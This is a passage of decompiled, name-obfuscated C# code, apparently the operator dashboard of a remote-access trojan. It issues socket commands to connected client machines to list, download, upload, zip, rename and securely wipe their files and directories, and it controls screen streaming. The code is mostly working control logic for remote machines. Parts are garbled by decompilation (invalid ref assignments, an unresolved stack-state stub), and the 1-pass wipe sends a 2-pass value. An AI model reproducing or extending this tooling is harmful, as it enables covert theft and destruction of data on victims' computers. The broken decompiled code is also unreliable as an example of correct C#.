                            this.method_49(ref Convert.ToBase64String(Encoding.UTF8.GetBytes(s)), ref Convert.ToBase64String(Encoding.UTF8.GetBytes(str)));
                            Thread.Sleep(1);
                            Application.DoEvents();
                            index++;
                        }
                    }
                    break;
                }
                num3 += 1L;
                num++;
            }
        }
    }

    private void method_44(object sender, EventArgs e)
    {
        Class125 class2 = new Class125();
        class2.fDashboard_0 = this;
        class2.folderBrowserDialog_0 = new FolderBrowserDialog();
        if (class2.folderBrowserDialog_0.ShowDialog() == DialogResult.OK)
        {
            Class124 class3 = new Class124();
            class3.class125_0 = class2;
            class3.string_0 = Strings.Replace(this.vmethod_398().Text, "Path: ", string.Empty, 1, -1, CompareMethod.Text);
            if (Operators.CompareString(Strings.Mid(class3.string_0, class3.string_0.Length, 1), @"\", true) != 0)
            {
                class3.string_0 = class3.string_0 + @"\";
            }
            if (MessageBox.Show("Upload " + class3.class125_0.folderBrowserDialog_0.SelectedPath + " to " + class3.string_0, Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
            {
                Class130.fTransferManager_0.Visible = true;
                bool flag = false;
                Form form2 = this;
                Form form = Class130.fTransferManager_0;
                Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
                form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
                if (flag)
                {
                    form.Visible = true;
                }
                Class130.fTransferManager_0.Opacity = 100.0;
                Class130.fTransferManager_0.Activate();
                new Thread(new ThreadStart(class3._Lambda$__0)).Start();
            }
        }
    }

    private void method_45(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_720();
        if (class2.SelectedItems.Count > 0)
        {
            Class130.fTransferManager_0.Visible = true;
            bool flag = false;
            Form form2 = this;
            Form form = Class130.fTransferManager_0;
            Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
            form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
            if (flag)
            {
                form.Visible = true;
            }
            Class130.fTransferManager_0.Opacity = 100.0;
            Class130.fTransferManager_0.Activate();
            int num = class2.Items.Count - 1;
            for (int i = 0; i <= num; i++)
            {
                if (class2.Items[i].Selected)
                {
                    ListViewItem item;
                    string str = Conversions.ToString((item = class2.Items[i]).Tag);
                    this.method_48(ref str, ref 0L);
                    item.Tag = str;
                }
            }
        }
        class2 = null;
    }

    private void method_46(object sender, EventArgs e)
    {
        if (this.string_8.Length >= 3)
        {
            this.vmethod_446().Enabled = false;
            this.vmethod_448().Enabled = false;
            this.vmethod_450().Enabled = false;
            this.vmethod_696().Enabled = false;
            this.vmethod_452().Enabled = false;
            this.vmethod_454().Enabled = false;
            this.vmethod_76().Enabled = false;
            this.vmethod_720().Items.Clear();
            this.vmethod_474().BringToFront();
            this.vmethod_474().Visible = true;
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_47(object sender, EventArgs e)
    {
        if (MessageBox.Show("Download selected directories?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
        {
            Form form;
            Form form2;
            bool flag;
            Rectangle rectangle;
            GClass7 class2 = this.vmethod_76();
            if (class2.SelectedItems.Count > 0)
            {
                Class130.fTransferManager_0.Visible = true;
                flag = false;
                form2 = this;
                form = Class130.fTransferManager_0;
                rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
                form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
                if (flag)
                {
                    form.Visible = true;
                }
                Class130.fTransferManager_0.Opacity = 100.0;
                Class130.fTransferManager_0.Activate();
            }
            int num2 = class2.Items.Count - 1;
            int num3 = 0;
            while (true)
            {
                int num;
                if (num3 > num2)
                {
                    if (num > 0)
                    {
                        Class130.fTransferManager_0.Visible = true;
                        flag = false;
                        form2 = this;
                        form = Class130.fTransferManager_0;
                        rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
                        form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
                        if (flag)
                        {
                            form.Visible = true;
                        }
                        Class130.fTransferManager_0.Opacity = 100.0;
                        Class130.fTransferManager_0.Activate();
                    }
                    class2 = null;
                    break;
                }
                if (class2.Items[num3].Selected)
                {
                    ListViewItem item;
                    string str = Conversions.ToString((item = class2.Items[num3]).Tag);
                    this.method_48(ref str, ref 0L);
                    item.Tag = str;
                    num++;
                }
                num3++;
            }
        }
    }

    public void method_48(ref string string_12, ref long long_1)
    {
        ConcurrentDictionary<string, CClient> dictionary;
        string str;
        ref double numRef;
        CClient client = (dictionary = Class130.concurrentDictionary_3)[str = this.string_4];
        string[] textArray1 = new string[] { "files_download|", this.string_4, "|", string_12, "|", Conversions.ToString((long) long_1) };
        ref string s = ref string.Concat(textArray1);
        ref CClient clientRef = ref client;
        s = s + "@";
        byte[] bytes = Encoding.UTF8.GetBytes(s);
        clientRef.sock_async.method_6(bytes);
        *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
        dictionary[str] = client;
    }

    public void method_49(ref string string_12, ref string string_13)
    {
        ConcurrentDictionary<string, CClient> dictionary;
        string str;
        ref double numRef;
        CClient client = (dictionary = Class130.concurrentDictionary_3)[str = this.string_4];
        string[] textArray1 = new string[10];
        textArray1[0] = "files_upload|";
        textArray1[1] = this.string_4;
        textArray1[2] = "|";
        textArray1[3] = string_12;
        textArray1[4] = "|";
        textArray1[5] = string_13;
        textArray1[6] = "|";
        textArray1[7] = Conversions.ToString(Class136.smethod_32(ref Encoding.UTF8.GetString(Convert.FromBase64String(string_12))));
        textArray1[8] = "|";
        textArray1[9] = Conversions.ToString(Class136.smethod_16(ref Encoding.UTF8.GetString(Convert.FromBase64String(string_12))));
        ref string s = ref string.Concat(textArray1);
        ref CClient clientRef = ref client;
        s = s + "@";
        byte[] bytes = Encoding.UTF8.GetBytes(s);
        clientRef.sock_async.method_6(bytes);
        *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
        dictionary[str] = client;
    }

    public void method_5(ref long long_1, ref string string_12)
    {
        // Unresolved stack state at '0000000D'
    }

    public void method_50(ref string string_12, ref string string_13)
    {
        StringBuilder builder = new StringBuilder();
        List<string> list = new List<string>();
        Stack<string> stack = new Stack<string>();
        stack.Push(string_12);
        while (stack.Count > 0)
        {
            string path = stack.Pop();
            list.AddRange(Directory.GetFiles(path));
            foreach (string str5 in Directory.GetDirectories(path))
            {
                stack.Push(str5);
                string s = string_13 + Path.GetFileName(string_12) + Strings.Replace(str5, string_12, string.Empty, 1, -1, CompareMethod.Text);
                builder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + "|");
            }
        }
        if (list.Count == 0)
        {
            Interaction.MsgBox("No file(s) to be uploaded!", MsgBoxStyle.Critical, Application.ProductName);
        }
        else
        {
            CClient client;
            string str;
            ref CClient clientRef;
            ref string strRef;
            byte[] bytes;
            ref double numRef;
            if (builder.Length > 0)
            {
                client = Class130.concurrentDictionary_3[str = this.string_4];
                strRef = ref "files_upload_createdirs|" + builder.ToString();
                clientRef = ref client;
                ConcurrentDictionary<string, CClient> dictionary2 = Class130.concurrentDictionary_3;
                strRef = strRef + "@";
                bytes = Encoding.UTF8.GetBytes(strRef);
                clientRef.sock_async.method_6(bytes);
                *(numRef = ref clientRef.stats_bytes_out) = numRef + strRef.Length;
                *(numRef = ref Class130.struct20_0.double_3) = numRef + strRef.Length;
                *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                dictionary2[str] = client;
            }
            string str8 = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            string key = Path.GetDirectoryName(string_13 + Path.GetFileName(string_12) + @"\") + " @ " + str8 + " [Upload]";
            Class130.concurrentDictionary_1.TryAdd(key, Directory.GetFiles(string_12, "*.*", SearchOption.AllDirectories).Length);
            int num5 = list.Count - 1;
            int num = 0;
            while (num <= num5)
            {
                Class130.long_3 += 1L;
                while (true)
                {
                    if (Class130.long_3 < Class135.smethod_0().TransfersConcurrentMax)
                    {
                        string str2;
                        List<string> list2;
                        int num3;
                        ConcurrentDictionary<string, CClient> dictionary;
                        string s = Path.GetDirectoryName(string_13 + Path.GetFileName(string_12) + Strings.Replace(list[num], string_12, string.Empty, 1, -1, CompareMethod.Text)) + @"\";
                        client = (dictionary = Class130.concurrentDictionary_3)[str2 = this.string_4];
                        string[] textArray1 = new string[12];
                        textArray1[0] = "files_upload_dir|";
                        textArray1[1] = this.string_4;
                        textArray1[2] = "|";
                        textArray1[3] = Convert.ToBase64String(Encoding.UTF8.GetBytes(list[num]));
                        textArray1[4] = "|";
                        textArray1[5] = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
                        textArray1[6] = "|";
                        string str3 = (list2 = list)[num3 = num];
                        list2[num3] = str3;
                        textArray1[7] = Conversions.ToString(Class136.smethod_32(ref str3));
                        textArray1[8] = "|";
                        textArray1[9] = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
                        textArray1[10] = "|";
                        str3 = (list2 = list)[num3 = num];
                        list2[num3] = str3;
                        textArray1[11] = Conversions.ToString(Class136.smethod_16(ref str3));
                        strRef = ref string.Concat(textArray1);
                        clientRef = ref client;
                        strRef = strRef + "@";
                        bytes = Encoding.UTF8.GetBytes(strRef);
                        clientRef.sock_async.method_6(bytes);
                        *(numRef = ref clientRef.stats_bytes_out) = numRef + strRef.Length;
                        *(numRef = ref Class130.struct20_0.double_3) = numRef + strRef.Length;
                        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                        dictionary[str2] = client;
                        num++;
                        break;
                    }
                    Thread.Sleep(1);
                }
            }
            client = Class130.concurrentDictionary_3[str = this.string_4];
            strRef = ref Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
            clientRef = ref client;
            ConcurrentDictionary<string, CClient> dictionary3 = Class130.concurrentDictionary_3;
            strRef = strRef + "@";
            bytes = Encoding.UTF8.GetBytes(strRef);
            clientRef.sock_async.method_6(bytes);
            *(numRef = ref clientRef.stats_bytes_out) = numRef + strRef.Length;
            *(numRef = ref Class130.struct20_0.double_3) = numRef + strRef.Length;
            *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
            dictionary3[str] = client;
        }
    }

    public void method_51(ref string string_12)
    {
        string str;
        ref double numRef;
        CClient client = Class130.concurrentDictionary_3[str = this.string_4];
        ref string s = ref "files_zip_dir|" + string_12;
        ref CClient clientRef = ref client;
        ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
        s = s + "@";
        byte[] bytes = Encoding.UTF8.GetBytes(s);
        clientRef.sock_async.method_6(bytes);
        *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
        dictionary[str] = client;
        this.vmethod_156().Tag = Encoding.UTF8.GetString(Convert.FromBase64String(string_12)) + ".zip";
    }

    public void method_52(ref string string_12, ref long long_1)
    {
        string str;
        ref double numRef;
        CClient client = Class130.concurrentDictionary_3[str = this.string_4];
        ref string s = ref "files_delete_dir_secure|" + string_12 + "|" + Conversions.ToString((long) long_1);
        ref CClient clientRef = ref client;
        ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
        s = s + "@";
        byte[] bytes = Encoding.UTF8.GetBytes(s);
        clientRef.sock_async.method_6(bytes);
        *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
        dictionary[str] = client;
        this.vmethod_156().Tag = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
    }

    public void method_53(ref string string_12)
    {
        string str;
        ref double numRef;
        CClient client = Class130.concurrentDictionary_3[str = this.string_4];
        ref string s = ref "files_delete_dir_normal|" + string_12;
        ref CClient clientRef = ref client;
        ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
        s = s + "@";
        byte[] bytes = Encoding.UTF8.GetBytes(s);
        clientRef.sock_async.method_6(bytes);
        *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
        dictionary[str] = client;
        this.vmethod_156().Tag = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
    }

    public void method_54(ref string string_12, ref string string_13)
    {
        string str;
        ref double numRef;
        CClient client = Class130.concurrentDictionary_3[str = this.string_4];
        ref string s = ref "files_rename|" + string_12 + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(string_13));
        ref CClient clientRef = ref client;
        ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
        s = s + "@";
        byte[] bytes = Encoding.UTF8.GetBytes(s);
        clientRef.sock_async.method_6(bytes);
        *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
        *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
        dictionary[str] = client;
    }

    private void method_55(object sender, EventArgs e)
    {
        Class130.fTransferManager_0.Visible = true;
        bool flag = false;
        Form form2 = this;
        Form form = Class130.fTransferManager_0;
        Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
        form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
        if (flag)
        {
            form.Visible = true;
        }
        Class130.fTransferManager_0.Opacity = 100.0;
        Class130.fTransferManager_0.Activate();
    }

    private void method_56(object sender, EventArgs e)
    {
        Class130.fTransferManager_0.Visible = true;
        bool flag = false;
        Form form2 = this;
        Form form = Class130.fTransferManager_0;
        Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
        form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
        if (flag)
        {
            form.Visible = true;
        }
        Class130.fTransferManager_0.Opacity = 100.0;
        Class130.fTransferManager_0.Activate();
    }

    private void method_57(object sender, EventArgs e)
    {
        if (MessageBox.Show("Add selected directory to ZIP?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
        {
            ListViewItem item;
            GClass7 class2 = this.vmethod_76();
            this.vmethod_170().Enabled = false;
            this.vmethod_174().Enabled = false;
            string str = Conversions.ToString((item = class2.SelectedItems[0]).Tag);
            this.method_51(ref str);
            item.Tag = str;
            class2 = null;
        }
    }

    private void method_58(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_720();
        if ((class2.SelectedItems.Count > 0) && (MessageBox.Show("Add selected file(s) (" + Conversions.ToString(class2.SelectedItems.Count) + ") to ZIP?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes))
        {
            this.vmethod_156().Tag = class2.SelectedItems[0].Text + ".zip";
            string left = string.Empty;
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    string str2;
                    ref double numRef;
                    CClient client = Class130.concurrentDictionary_3[str2 = this.string_4];
                    ref string s = ref "files_zip|" + left;
                    ref CClient clientRef = ref client;
                    ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                    dictionary[str2] = client;
                    this.vmethod_170().Enabled = false;
                    this.vmethod_174().Enabled = false;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(class2.Items[num2].Tag, "|")));
                }
                num2++;
            }
        }
        class2 = null;
    }

    private void method_59(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_720();
        if ((class2.SelectedItems.Count > 0) && (MessageBox.Show("Delete selected " + Conversions.ToString(class2.SelectedItems.Count) + " file(s)? [Normal delete]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes))
        {
            string left = string.Empty;
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    string str2;
                    ref double numRef;
                    CClient client = Class130.concurrentDictionary_3[str2 = this.string_4];
                    ref string s = ref "files_delete_normal|" + left;
                    ref CClient clientRef = ref client;
                    ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                    dictionary[str2] = client;
                    this.vmethod_170().Enabled = false;
                    this.vmethod_174().Enabled = false;
                    this.vmethod_146().Enabled = false;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(class2.Items[num2].Tag, "|")));
                }
                num2++;
            }
        }
        class2 = null;
    }

    public void method_6()
    {
        if (this.vmethod_686().InvokeRequired)
        {
            this.vmethod_686().Invoke(new Delegate24(this.method_6), new object[0]);
        }
        else
        {
            Class130.concurrentDictionary_3[this.string_4].SCREEN_IS_STREAMING = false;
            this.vmethod_686().Text = "Start";
            this.vmethod_686().Enabled = true;
            this.vmethod_246().Enabled = true;
            this.vmethod_88().Enabled = true;
            this.vmethod_86().Enabled = true;
            this.vmethod_246().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_88().Items.Count > 1, true, false));
            this.vmethod_250().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_246().Checked, true, false));
        }
    }

    private void method_60(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_720();
        if ((class2.SelectedItems.Count > 0) && (MessageBox.Show("Secure delete selected " + Conversions.ToString(class2.SelectedItems.Count) + " file(s)? [7 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes))
        {
            string left = "7|";
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    string str2;
                    ref double numRef;
                    CClient client = Class130.concurrentDictionary_3[str2 = this.string_4];
                    ref string s = ref "files_delete_secure|" + left;
                    ref CClient clientRef = ref client;
                    ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                    dictionary[str2] = client;
                    this.vmethod_170().Enabled = false;
                    this.vmethod_174().Enabled = false;
                    this.vmethod_146().Enabled = false;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(class2.Items[num2].Tag, "|")));
                }
                num2++;
            }
        }
        class2 = null;
    }

    private void method_61(object sender, EventArgs e)
    {
        string left = string.Empty;
        GClass7 class2 = this.vmethod_720();
        if ((class2.SelectedItems.Count > 0) && (MessageBox.Show("Secure delete selected " + Conversions.ToString(class2.SelectedItems.Count) + " file(s)? [3 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes))
        {
            left = "3|";
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    string str2;
                    ref double numRef;
                    CClient client = Class130.concurrentDictionary_3[str2 = this.string_4];
                    ref string s = ref "files_delete_secure|" + left;
                    ref CClient clientRef = ref client;
                    ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                    dictionary[str2] = client;
                    this.vmethod_170().Enabled = false;
                    this.vmethod_174().Enabled = false;
                    this.vmethod_146().Enabled = false;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(class2.Items[num2].Tag, "|")));
                }
                num2++;
            }
        }
        class2 = null;
    }

    private void method_62(object sender, EventArgs e)
    {
        string left = string.Empty;
        GClass7 class2 = this.vmethod_720();
        if ((class2.SelectedItems.Count > 0) && (MessageBox.Show("Secure delete selected " + Conversions.ToString(class2.SelectedItems.Count) + " file(s)? [2 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes))
        {
            left = "2|";
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    string str2;
                    ref double numRef;
                    CClient client = Class130.concurrentDictionary_3[str2 = this.string_4];
                    ref string s = ref "files_delete_secure|" + left;
                    ref CClient clientRef = ref client;
                    ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                    dictionary[str2] = client;
                    this.vmethod_170().Enabled = false;
                    this.vmethod_174().Enabled = false;
                    this.vmethod_146().Enabled = false;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(class2.Items[num2].Tag, "|")));
                }
                num2++;
            }
        }
        class2 = null;
    }

    private void method_63(object sender, EventArgs e)
    {
        string left = string.Empty;
        GClass7 class2 = this.vmethod_720();
        if ((class2.SelectedItems.Count > 0) && (MessageBox.Show("Secure delete selected " + Conversions.ToString(class2.SelectedItems.Count) + " file(s)? [1 Pass]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes))
        {
            left = "2|";
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    string str2;
                    ref double numRef;
                    CClient client = Class130.concurrentDictionary_3[str2 = this.string_4];
                    ref string s = ref "files_delete_secure|" + left;
                    ref CClient clientRef = ref client;
                    ConcurrentDictionary<string, CClient> dictionary = Class130.concurrentDictionary_3;
                    s = s + "@";
                    byte[] bytes = Encoding.UTF8.GetBytes(s);
                    clientRef.sock_async.method_6(bytes);
                    *(numRef = ref clientRef.stats_bytes_out) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_3) = numRef + s.Length;
                    *(numRef = ref Class130.struct20_0.double_5) = numRef + 1.0;
                    dictionary[str2] = client;
                    this.vmethod_170().Enabled = false;
                    this.vmethod_174().Enabled = false;
                    this.vmethod_146().Enabled = false;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    left = Conversions.ToString(Operators.AddObject(left, Operators.ConcatenateObject(class2.Items[num2].Tag, "|")));
                }
                num2++;
            }
        }
        class2 = null;
    }

    private void method_64(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_76();
        if (MessageBox.Show("Secure delete selected directory? [7 passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            ListViewItem item;
            this.vmethod_170().Enabled = false;
            this.vmethod_174().Enabled = false;
            this.vmethod_146().Enabled = false;
            this.vmethod_218().Enabled = false;
            string str = Conversions.ToString((item = class2.SelectedItems[0]).Tag);
            this.method_52(ref str, ref 7L);
            item.Tag = str;
        }
        class2 = null;
    }

    private void method_65(object sender, EventArgs e)
    {
        if (MessageBox.Show("Delete selected directory? [Normal delete]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            ListViewItem item;
            GClass7 class2 = this.vmethod_76();
            this.vmethod_170().Enabled = false;
            this.vmethod_174().Enabled = false;
            this.vmethod_146().Enabled = false;
            this.vmethod_218().Enabled = false;
            string str = Conversions.ToString((item = class2.SelectedItems[0]).Tag);
            this.method_53(ref str);
            item.Tag = str;
            class2 = null;
        }
    }

    private void method_66(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_76();
        if (MessageBox.Show("Secure delete selected directory? [3 passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            ListViewItem item;
            this.vmethod_170().Enabled = false;
            this.vmethod_174().Enabled = false;
            this.vmethod_146().Enabled = false;
            this.vmethod_218().Enabled = false;
            string str = Conversions.ToString((item = class2.SelectedItems[0]).Tag);
            this.method_52(ref str, ref 3L);
            item.Tag = str;
        }
        class2 = null;
    }

    private void method_67(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_76();
        if (MessageBox.Show("Secure delete selected directory? [2 passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            ListViewItem item;
            this.vmethod_170().Enabled = false;
            this.vmethod_174().Enabled = false;
            this.vmethod_146().Enabled = false;
            this.vmethod_218().Enabled = false;
            string str = Conversions.ToString((item = class2.SelectedItems[0]).Tag);
            this.method_52(ref str, ref 2L);
            item.Tag = str;
        }
        class2 = null;
    }

    private void method_68(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_76();
        if (MessageBox.Show("Secure delete selected directory? [1 pass]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            ListViewItem item;
            this.vmethod_170().Enabled = false;
            this.vmethod_174().Enabled = false;
            this.vmethod_146().Enabled = false;
            this.vmethod_218().Enabled = false;
            string str = Conversions.ToString((item = class2.SelectedItems[0]).Tag);
            this.method_52(ref str, ref 1L);
            item.Tag = str;
        }
        class2 = null;
    }

    private void method_69(object sender, ListViewItemSelectionChangedEventArgs e)
    {
        this.vmethod_116().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_76().SelectedItems.Count > 0, true, false));
        this.vmethod_216().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_76().SelectedItems.Count > 0, true, false));
        this.vmethod_168().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_76().SelectedItems.Count > 0, true, false));
    }

    public void method_7(ref string string_12)
    {
        if (this.vmethod_88().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_88().Invoke(new Delegate19(this.method_7), args);
        }
        else
        {
            string[] strArray = Strings.Split(string_12, ":", -1, CompareMethod.Text);
            this.vmethod_88().Items.Clear();
            this.vmethod_250().Items.Clear();
            this.concurrentStack_0.Clear();
            int num2 = strArray.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (strArray[i].Length > 0)
                {
                    Class130.Struct19 struct2;
                    string expression = Strings.Split(Strings.Replace(strArray[i], " [Primary]", string.Empty, 1, -1, CompareMethod.Text), ",", -1, CompareMethod.Text)[2];
                    struct2.long_0 = Conversions.ToInteger(Strings.Split(expression, "x", -1, CompareMethod.Text)[0]);
                    struct2.long_1 = Conversions.ToInteger(Strings.Split(expression, "x", -1, CompareMethod.Text)[1]);
                    this.concurrentStack_0.Push(struct2);
                    this.vmethod_88().Items.Add(Strings.Split(strArray[i], ",", -1, CompareMethod.Text)[0] + " - " + Strings.Split(strArray[i], ",", -1, CompareMethod.Text)[2]);
                    this.vmethod_250().Items.Add(Strings.Split(strArray[i], ",", -1, CompareMethod.Text)[0] + " - " + Strings.Split(strArray[i], ",", -1, CompareMethod.Text)[2]);
                }
            }
            if (this.vmethod_88().Items.Count == 0)
            {
                Interaction.MsgBox("No monitors found!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
